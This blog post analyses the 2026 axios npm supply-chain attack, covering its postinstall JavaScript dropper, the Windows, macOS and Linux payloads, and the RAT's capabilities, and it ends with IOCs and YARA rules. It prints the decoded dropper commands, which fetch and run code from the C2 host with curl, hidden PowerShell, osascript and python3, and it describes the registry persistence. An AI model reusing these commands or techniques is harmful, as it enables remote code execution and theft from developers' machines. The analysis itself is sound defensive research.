---
layout: post
title: "Axios NPM Supply Chain Attack Analysis"
date: 2026-04-10
categories: ['Malware']
comments: true
author: Hemal Maniar
description: Analysis of the recent Axios NPM supply chain attack that has been attributed to the North Korean state-sponsored APT Sapphire Sleet. The blog dives into the analysis of the Javascript dropper and the dynamic secondary payload (RAT) delivered to the target system from an attackercontrolled C2 server.
meta-description: Analysis of the recent Axios NPM supply chain attack that has been attributed to the North Korean state-sponsored APT Sapphire Sleet. The blog dives into the analysis of the Javascript dropper and the dynamic secondary payload (RAT) delivered to the target system from an attackercontrolled C2 server.
keywords: 'malware,analysis,axios,npm,sapphire sleet,remote access trojan,RAT,security research,malware research'
image:
alt:
output: 
  html_document:
    toc: true
    toc_float: true
    toc_collapsed: true
    toc_depth: 3
    number_sections: true
    theme: lumen
---

### Attack Background
The WAVESHAPER campaign is a high-precision supply chain attack attributed to the North Korean state-sponsored group **Sapphire Sleet** (UNC1069). On March 31, 2026, the actor targeted the widely used `axios` HTTP client which sees over 100 million weekly downloads by compromising a maintainer account and injecting a parasitic dependency named `plain-crypto-js`.

This wasn't an impulsive hack. The attacker pre-staged a benign version of the dependency 18 hours in advance to bypass "new package" red flags. By the time the malicious `axios` version was published, the ecosystem's automation (NPM's `postinstall` hook) became the delivery mechanism for a multi-platform Remote Access Trojan (RAT).

Whenever a developer runs the command such as:
```bash
npm install axios
```

The magic happens with the `package.json` file where the attacker hides a command in the `scripts` section under a hook called `postinstall`.  NPM is designed to automatically run scripts that are intended to be compiled after a package is downloaded. The attacker leverages this functionality to make the package install process execute a malicious `.js`.

![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260410004539.png)

As soon as the download finishes, the computer will silently execute the JavaScript dropper.

### Attack Chain

1. Infection - A developer installs the compromised NPM package. The `postinstall` hook runs the obfuscated JavaScript.
2. OS Fingerprinting - The JavaScript detects the host OS.
3. Staging & Persistence - Drops the relevant malicious file into the system. For Windows, drops a `.bat` file, that establishes registry persistence, and `.bat` pulls and executes a PowerShell script into memory. For Linux, it drops and executes a Python script.
4. System Recon & Exfiltration - Once executed, the script gathers detailed system hardware, user, process, and sensitive directory data. This metadata gets wrapped in a structured JSON format which is then sent to the attacker's server via HTTP POST method.
5. Command and Control: The infected machine sends a beacon to the attacker's server every 60 seconds, and waits for the attacker to respond with a command to execute binaries, inject process, or download secondary payloads.

#### RAT Dropper

The JavaScript dropper contains a logic to hunt for legitimate PowerShell binary on a Windows system. It is to masquerade itself under a legitimate process, it does so by copying the legitimate binary to a new location under `C:\ProgramData\wt.exe`. 

By renaming it to `wt.exe`, it manages to trick the system and the user into thinking that the Windows Terminal app is running, when instead it is a copied version of PowerShell binary running a malicious code. The variable `PS_BINARY` is dynamically set to `C:\ProgramData\wt.exe` that executes the payload.

The file `e10b1...e09.js` is the brain of the initial infection. It uses custom cipher to hide the C2 server addresses and the logic it uses to drop the secondary payload. 

Copying the following functions from the obfuscated block `_trans_1` and `_transe_2`  along with `stq` and `ord` 

![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409170901.png)

Running a decoder loop over the script to display indexed outputs
```js
stq.forEach((val, index) => { console.log(`Index ${index}: ${_trans_2(val, ord)}`); });
```

![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409171036.png)

The values at Index 0, 1, and 2 reveals core node.js modules that are being loaded (`child_process`, `os`, `fs`)

Index 3 reveals the URL `http://sfrclak[.]com:8000/` which is likely the Command and Control (C2) server to carry out this operation. This acts as a dynamic payload delivery system.

Index 5 & 6 act as OS identifiers. This will likely be used so that the right payload can be fetched for the system based on its OS.

Didn't index other strings as they were too large for node console. Headed on over to [Codechef](https://www.codechef.com/javascript-online-compiler) 

```
Index[0]: child_process
Index[1]: os
Index[2]: fs
Index[3]: http://sfrclak.com:8000/
Index[4]: (empty)
Index[5]: win32
Index[6]: darwin
Index[7]: 
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""SCR_LINK"" > ""PS_PATH"" & ""PS_BINARY"" -w hidden -ep bypass -file ""PS_PATH"" ""SCR_LINK"" & del ""PS_PATH"" /f", 0, False
    
Index[8]: cscript "LOCAL_PATH" //nologo && del "LOCAL_PATH" /f
Index[9]: 
    set {a, s, d} to {"", "SCR_LINK", "/Library/Caches/com.apple.act.mond"}
        try
            do shell script "curl -o " & d & a & " -d packages.npm.org/product0" & " -s " & s & " && chmod 770 " & d & " && /bin/zsh -c \"" & d & " " & s & " &\" &> /dev/null"
        end try
    do shell script "rm -rf LOCAL_PATH"
Index[10]: nohup osascript "LOCAL_PATH" > /dev/null 2>&1 &
Index[11]: (empty)
Index[12]: curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &
Index[13]: package.json
Index[14]: package.md
Index[15]: .exe
Index[16]: .ps1
Index[17]: .vbs
```

##### OS Fingerprinting

Inspecting the `for(;;)` loop and `o === ` blocks

![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409171900.png)

`win32`: The code looks for `o === _trans_2(stq[5], ord` and constructs a command to drop 

`darwin`: The code looks for `o === _trans_2(stq[6]. ord`. It downloads the Mach-O payload (`92ff...645a.macho`) and grants it permissions to execute.

Else it assumes that it is a Linux machine.

##### Windows Attack Vector (Index 7 & 8)

The dropper now fetches the malware from the C2 link and executes it in a 2-step process. Instead of directly running a Powershell which can trigger alerts, the malware creates a VBScript file.

It uses `curl` to fetch the RAT from the C2 link (`SCR_LINK`) and saves it in a temporary path `PS_PATH` and executes the binary with `-ep bypass` to ignore execution policies. Upon execution the file is then deleted from the temporary path.

The `, 0, False` at the end of the command ensures that the window is not visible to the user.

The 2nd stage acts as a trigger that runs the VBScript using `cscript` and deletes the script file `del "LOCAL_PATH" /f` to remove any traces of the file.
```
Index[7]: 
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""SCR_LINK"" > ""PS_PATH"" & ""PS_BINARY"" -w hidden -ep bypass -file ""PS_PATH"" ""SCR_LINK"" & del ""PS_PATH"" /f", 0, False
    
Index[8]: cscript "LOCAL_PATH" //nologo && del "LOCAL_PATH" /f
```

##### Linux Attack Vector (Index 12)

The dropper fetches a python file `fcb8...75cf.py` from the C2 server using `curl`
```bash
curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &
```

It downloads the python script to the `/tmp` folder and launches it using `python3`.

##### OS Identifiers

The body parameter of the post request to the server acts as a password/identifier for the C2 server to determine the host OS.
 
- `packages.npm.org/product0` - MacOS
- `packages.npm.org/product1` - Windows
- `packages.npm.org/product2` - Linux

This is a clever way to disguise itself as a legitimate POST request under a legitimate domain, which in turn works as an OS identifier for the C2 server to respond with the right malware payload.
### Analyzing the Payloads

#### Windows Payload 

`f7d3...21cd.bat` file is executed once the initial Javascript dropper detects that it is running on Windows. This file reaches out to the C2 server (`sfrclak[.]com`) and downloads the payload `6fbb...c14b.ps1` which is the brain of Windows operation.

It does this by running `Invoke-WebRequest` command to download the text from the server and with the `[scriptblock]::Create` command, the code is executed immediately into computer memory without being saves as a PowerShell script. 

The first thing the script attempts to do is maintain persistence by creating a file named `system.bat` in `C:\ProgramData\` and adds it to the Windows Registry Run Key `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`.

![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409200311.png)

`Set-ItemProperty -Path $regKey -Name $regName -Value $batFile` will automatically run the batch file, which downloads the latest version of the malware from the server.

Once it has maintained persistence, the script starts gathering device information including:
- username
- computer name
- OS version
- list of running processes 

It packages all of this in a JSON object with the type `BaseInfo`.
![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409231527.png)

This JSON data is sent to the C2 server every 60 seconds.

The script also allows an attacker to have a backdoor access. This is done via the `Process-Request` function that allows an attacker to send a command back to the system.

`runscript` allows an attacker to run another PowerShell script for the agent to run
![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409231839.png)

`peinject` allows the attacker to send a Windows `.dll` file in Base64 format. This will enable the script to load that DLL directly into memory.

#### Linux Payload

The script begins with gathering system information to verify the target, understand the environment. This is divided across various functions.

1. `get_os()`
This checks machine architecture to verify whether its `linux_x64` or `linux_arm`. 
![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409232428.png)

2. `get_boot_time(), get_host_name(), get_user_name(), get_installation_time(), get_system_info()`
Gathering additional metadata related to the device, user, timezone, kernel version, system uptime, installation date, and system information.
![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409232658.png)

![](/assets/img/posts/axios-npm-supply-chain/Pasted%20image%2020260409232813.png)

3. `get_process_list()` 
This gathers information including pid, ppid, username, start time, and cmdline. This allows the attacker to list and view every single running process on the system, including background processes that can  reveal sensitive information within command-line arguments. Just like the Windows version, this data is sent over to the C2 server every 60 seconds in a standarised JSON format.

4. `process_request()`
This is where the attacker gains the capability to remotely control a compromised system. After sending the data back to the C2 server, it waits for a command from the attacker. The script allows the attacker to carry out 4 different command types:
- `runscript` - This downloads a new script on the device and stores it into `/tmp/` folder and executes it. This allows the attacker to update the malware or add new features.
- `peinject` - This is to load or execute a binary code.
- `rundir` - This acts as a file browser that allows the attacker to view contents of any directory within the system.
- `kill` - Capability to kill a running process within the system.

### Self-Cleanup 

Immediately after the execution, the JavaScript executes the following commands to clean up after a successful execution of the dropper function.
1. `fs.unlink(...js)` - this removes the `.js` file from the package `node_modules/plain-crypto-js`
2. `fs.unlink(package.json)` - this deletes the file containing `"postinstall": "node setup.js"
3. `fs.rename()` - Renames `package.md` to `package.json`

### Indicators of Compromise

#### Network Indicators

1. Domain: `sfrclakp[.]com`
2. IP Address: `142[.]11[.]206[.]73`
3. URL: `http://sfrclak[.]com:8000/6202033`
4. Post Body: 
- `packages.npm.org/product0` (macOS)
- `packages.npm.org/product1` (Windows)
- `packages.npm.org/product2` (Linux)

#### System Indicators

1. Windows 
- `%PROGRAMDATA%\wt.exe`
- `%TEMP%\6202033.vbs`
- `%TEMP%\6202033.ps1`
- `%PROGRAMDATA%\system.bat`

2. Linux
- `/tmp/ld.py`

### YARA Rules

Rule for `setup.js` which is the JavaScript dropper
```
rule SapphireSleet_WAVESHAPER_JSDropper {
    meta:
        description = "Detects the JS dropper postinstall script for the WAVESHAPER supply chain attack"
        author = "Hemal Maniar/he_malware"
        date = "2026-04-10"
        threat_actor = "Sapphire Sleet"
    strings:
        $c2_url = "sfrclak.com:8000" ascii wide
        $route1 = "packages.npm.org/product0" ascii wide
        $route2 = "packages.npm.org/product1" ascii wide
        $route3 = "packages.npm.org/product2" ascii wide
        
        $func1 = "_trans_1" ascii wide
        $func2 = "_trans_2" ascii wide        
    condition:
        ($c2_url or any of ($route*)) and (all of ($func*))
}
```

Rule for the PowerShell script that gets executed as a secondary payload
```
rule SapphireSleet_WAVESHAPER_PS1_Agent {
    meta:
        description = "Detects the Windows PowerShell RAT payload for WAVESHAPER"
        author = "Hemal Maniar/he_malware"
        date = "2026-04-10"
        threat_actor = "Sapphire Sleet"
    strings:
        $c2 = "sfrclak.com:8000" ascii wide
        $json_beacon = "\"type\": \"BaseInfo\"" ascii wide
        
        $mem_exec = "[scriptblock]::Create" ascii wide nocase
        
        $cmd1 = "runscript" ascii wide
        $cmd2 = "peinject" ascii wide
        $cmd3 = "rundir" ascii wide
        
    condition:
        $c2 and $json_beacon and $mem_exec and any of ($cmd*)
}
```

There’s nothing obviously suspicious here and that’s the point.

This attack worked because it blended in. It didn’t rely on breaking things, just on being trusted.

It’s a reminder to be a bit more aware of what we install and run, even when it looks normal.